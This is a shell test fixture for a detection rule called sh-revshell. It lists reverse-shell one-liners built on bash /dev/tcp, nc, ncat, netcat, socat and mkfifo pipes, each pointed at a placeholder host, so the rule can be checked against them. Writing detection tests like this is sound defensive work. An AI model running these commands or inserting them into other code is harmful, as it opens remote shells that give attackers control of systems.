#!/bin/sh
# Fixture only — never executed. One annotated instance per alternative of the rule
# named in the file name; `# ruleid:` names the rule the next line must draw.
# ruleid: sh-revshell
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
# ruleid: sh-revshell
exec 3<>/dev/udp/203.0.113.7/53
# ruleid: sh-revshell
nc -w 3 -e /bin/sh example.invalid 4444
# ruleid: sh-revshell
ncat example.invalid 4444 -e /bin/bash
# ruleid: sh-revshell
socat tcp:example.invalid:4444 EXEC:/bin/sh,pty,stderr
# ruleid: sh-revshell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc example.invalid 4444 > /tmp/f
# ruleid: sh-revshell
netcat -e /bin/sh example.invalid 4444
# ruleid: sh-revshell
nc example.invalid 4444 -c /bin/sh
# ruleid: sh-revshell
ncat -c 'bash -i' example.invalid 4444
# ruleid: sh-revshell
ncat --exec /bin/sh example.invalid 4444
# ruleid: sh-revshell
ncat --sh-exec 'bash -i' example.invalid 4444
# ruleid: sh-revshell
ncat --lua-exec shell.lua example.invalid 4444
# ruleid: sh-revshell
socat tcp:example.invalid:4444 SYSTEM:/bin/sh
# ruleid: sh-revshell
socat tcp:example.invalid:4444 exec:/bin/sh
# The mkfifo pipe read by each shell, piped and redirected.
# ruleid: sh-revshell
mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc example.invalid 4444 > /tmp/f
# ruleid: sh-revshell
mkfifo /tmp/f; cat /tmp/f | zsh -i 2>&1 | nc example.invalid 4444 > /tmp/f
# ruleid: sh-revshell
mkfifo /tmp/f; cat /tmp/f | dash -i 2>&1 | nc example.invalid 4444 > /tmp/f
# ruleid: sh-revshell
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc example.invalid 4444 > /tmp/f
# ruleid: sh-revshell
mkfifo /tmp/f; bash -i 0</tmp/f 2>&1 | nc example.invalid 4444 1>/tmp/f
